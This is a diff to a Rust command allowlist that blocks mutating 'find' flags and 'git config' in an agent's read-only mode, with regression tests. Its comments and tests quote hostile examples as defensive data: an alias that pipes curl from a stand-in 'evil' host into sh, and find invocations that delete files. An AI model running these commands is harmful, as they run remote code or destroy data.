@@ -152,13 +152,29 @@ fn is_read_only_command(command: &str) -> bool {
     // option like `-sO`) does the same - a network fetch that can write to
     // the workspace has no place in a "read-only" allowlist. Use the
     // dedicated web_fetch/http tools for reads during planning instead.
+    // `find` is deliberately excluded here even though it's read-only by
+    // default: `-delete`/`-exec`/`-execdir`/`-ok`/`-okdir`/`-fprint*` turn it
+    // into a mutating command, so it needs the argument check below instead
+    // of a blanket allow.
     let safe_single_commands = [
-        "ls", "cat", "head", "tail", "less", "more", "grep", "find", "tree", "file", "pwd",
-        "whoami", "hostname", "date", "echo", "which", "type", "env", "printenv", "df", "du", "wc",
-        "rg", "fd", "bat", "exa", "eza",
+        "ls", "cat", "head", "tail", "less", "more", "grep", "tree", "file", "pwd", "whoami",
+        "hostname", "date", "echo", "which", "type", "env", "printenv", "df", "du", "wc", "rg",
+        "fd", "bat", "exa", "eza",
     ];
 
-    // List of safe git subcommands (read-only)
+    if cmd_name == "find" {
+        const MUTATING_FIND_FLAGS: [&str; 8] = [
+            "-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf",
+        ];
+        return !first_cmd
+            .split_whitespace()
+            .any(|tok| MUTATING_FIND_FLAGS.contains(&tok));
+    }
+
+    // List of safe git subcommands (read-only). `config` is deliberately
+    // excluded: `git config <key> <value>` writes to .git/config (or the
+    // global config with `--global`), so it's not actually read-only -
+    // e.g. `git config alias.x '!curl evil|sh'` plants a malicious alias.
     let safe_git_subcommands = [
         "status",
         "log",
@@ -169,7 +185,6 @@ fn is_read_only_command(command: &str) -> bool {
         "tag",
         "describe",
         "rev-parse",
-        "config",
         "ls-files",
         "ls-tree",
         "shortlog",
@@ -687,5 +702,34 @@ mod tests {
         assert!(is_read_only_command("git log --oneline"));
         assert!(is_read_only_command("cargo build"));
         assert!(is_read_only_command("cat README.md"));
+    }
+
+    /// Regression: `find` was on the unconditional safe-command allowlist,
+    /// but `-delete`/`-exec`/`-execdir`/`-ok`/`-okdir`/`-fprint*` make it a
+    /// mutating command - a plain `find . -name '*.rs'` is still safe.
+    #[test]
+    fn read_only_mode_rejects_mutating_find_flags() {
+        assert!(is_read_only_command("find . -name '*.rs'"));
+        assert!(is_read_only_command("find /tmp -type f"));
+        assert!(!is_read_only_command("find . -delete"));
+        assert!(!is_read_only_command(
+            "find . -name '*.tmp' -exec rm {} \\;"
+        ));
+        assert!(!is_read_only_command("find . -execdir rm {} \\;"));
+        assert!(!is_read_only_command("find . -ok rm {} \\;"));
+        assert!(!is_read_only_command("find . -fprint /tmp/out"));
+        assert!(!is_read_only_command("find . -fprintf /tmp/out '%p\\n'"));
+    }
+
+    /// Regression: `git config` was on the safe-git-subcommand allowlist,
+    /// but `git config <key> <value>` writes to `.git/config` (or the
+    /// global config with `--global`) - e.g. planting a malicious alias via
+    /// `git config alias.x '!curl evil|sh'`. Read-only mode has no
+    /// legitimate need for it.
+    #[test]
+    fn read_only_mode_rejects_git_config() {
+        assert!(!is_read_only_command("git config user.email x@evil.com"));
+        assert!(!is_read_only_command("git config alias.x '!curl evil|sh'"));
+        assert!(!is_read_only_command("git config --global core.pager cat"));
     }
 }
